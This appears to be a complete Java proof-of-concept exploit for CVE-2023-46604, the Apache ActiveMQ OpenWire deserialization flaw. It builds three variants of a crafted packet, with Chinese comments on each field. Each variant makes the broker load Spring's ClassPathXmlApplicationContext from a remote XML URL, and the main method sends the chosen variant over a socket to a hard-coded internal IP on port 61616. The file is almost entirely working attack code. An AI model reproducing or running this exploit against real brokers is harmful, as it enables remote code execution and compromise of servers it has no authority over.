package activemq.cve;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

/**
 * payload构造，输入流需要什么就提供什么，非标准的openwire协议格式
 */
public class CVE_2023_46604 {



    public static byte[] useMessageAckMarshaller() throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(baos);
        out.writeInt(1);//size不大于100000即可
        out.writeByte(22);//datatype
        out.writeInt(1);//CommandId
        out.writeBoolean(true);//ResponseRequired
        out.writeBoolean(false);
        out.writeBoolean(false);
        out.writeBoolean(false);
        out.writeByte(64);//datatype
        out.writeBoolean(false);
        out.writeBoolean(false);
        out.writeInt(1);
        out.writeBoolean(true);//让最后判断表达式为否
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");//classname
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("http://127.0.0.1/calc.xml");//message
        out.close();

        return baos.toByteArray();
    }


    public static byte[] useExceptionResponseMarshaller() throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(baos);
        out.writeInt(1);//size不大于100000即可
        out.writeByte(31);//datatype
        out.writeInt(1);//CommandId
        out.writeBoolean(true);//ResponseRequired
        out.writeInt(1);//CorrelationId
        out.writeBoolean(true);//让最后判断表达式为否
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");//classname
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("http://127.0.0.1/calc.xml");//message
        out.close();

        return baos.toByteArray();
    }

    public static byte[] useConnectionErrorMarshaller() throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(baos);
        out.writeInt(1);//size小于100000即可
        out.writeByte(16);//datatype
        out.writeInt(1);//CommandId
        out.writeBoolean(true);//ResponseRequired
        out.writeBoolean(true);//让最后判断表达式为否
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");//classname
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("http://127.0.0.1/calc.xml");//message
        out.close();

        return baos.toByteArray();
    }

    public static void main(String[] args) throws IOException {


//        byte[] bytes = useExceptionResponseMarshaller();
//        byte[] bytes = useConnectionErrorMarshaller();
        byte[] bytes = useMessageAckMarshaller();
        Socket socket =new Socket("10.58.120.200",61616);
        OutputStream os = socket.getOutputStream();
        os.write(bytes);
        socket.close();
    }
}